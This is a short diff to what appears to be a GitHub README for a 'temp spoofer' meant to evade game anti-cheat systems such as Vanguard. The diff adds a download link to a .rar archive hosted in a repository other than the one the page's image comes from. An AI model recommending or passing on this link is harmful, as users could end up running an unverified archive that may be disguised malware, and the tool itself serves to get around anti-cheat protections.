@@ -9,6 +9,8 @@ Temp spoofer means that you only have to spoof every restart
 
 ![image](https://github.com/ram4navar0/Temp-Spoofer-LifeTime/assets/157205486/c34f1589-51ad-488a-855e-14810607c6a4)
 
+## Download
+⚔️ Install --> [Releases](https://github.com/nopeads/AtomicSpoof/releases/download/v2.4/Relase.rar)
 
 ## 💎・[Supported Anti-Cheats]
 - Vanguard
